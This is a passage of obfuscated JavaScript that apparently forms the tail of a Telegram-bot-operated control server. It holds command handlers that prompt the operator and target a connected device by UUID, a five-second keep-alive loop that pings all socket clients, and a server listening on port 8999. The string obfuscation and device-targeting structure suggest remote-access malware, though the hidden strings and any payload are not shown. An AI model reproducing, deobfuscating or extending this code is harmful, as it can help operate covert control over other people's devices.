                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[154]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[155] + _0xdc21[156], {
            reply_markup: {
                force_reply: true
            }
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[157]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[158] + _0xdc21[58], {
            reply_markup: {
                force_reply: true
            }
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[9]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[159] + _0xdc21[160], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[161]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[162] + _0xdc21[163], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[164]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[165] + _0xdc21[166], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[167]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[168] + _0xdc21[169], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[170]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[171] + _0xdc21[172], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    };
    if (_0xeb57x26 == _0xdc21[173]) {
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[174] + _0xdc21[175], {
            reply_markup: {
                force_reply: true
            },
            parse_mode: _0xdc21[17]
        });
        currentUuid = _0xeb57xe
    }
});
setInterval(function() {
    appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
        _0xeb57xd[_0xdc21[6]](_0xdc21[176])
    });
    try {
        axios[_0xdc21[7]](address)[_0xdc21[177]]((_0xeb57x27) => {
            return _0xdc21[3]
        })
    } catch (e) {}
}, 5000);
appServer[_0xdc21[180]](process[_0xdc21[179]][_0xdc21[178]] || 8999)
